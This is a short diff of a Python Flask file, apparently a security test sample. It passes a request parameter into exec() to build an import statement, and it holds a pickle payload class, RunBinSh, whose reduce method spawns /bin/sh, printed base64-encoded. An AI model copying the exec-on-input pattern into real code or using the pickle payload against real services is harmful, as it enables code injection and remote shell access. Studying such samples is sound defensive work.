@@ -28,7 +28,7 @@ class RunBinSh(object):
         return (subprocess.Popen, (('/bin/sh',),))
 
 def import_urlib_version(version):
-    exec("import urllib%s as urllib" % version)
+    exec("import urllib%s as urllib" % sanitize(version))
 
 def sanitize(module):
     return DICT.get(module, '3.0')
@@ -36,7 +36,7 @@ def sanitize(module):
 @app.route('/')
 def index():
     module = flask.request.args.get("module")
-    import_urlib_version(sanitize(module))
+    import_urlib_version(module)
 
 
 print(base64.b64encode(pickle.dumps(RunBinSh())))
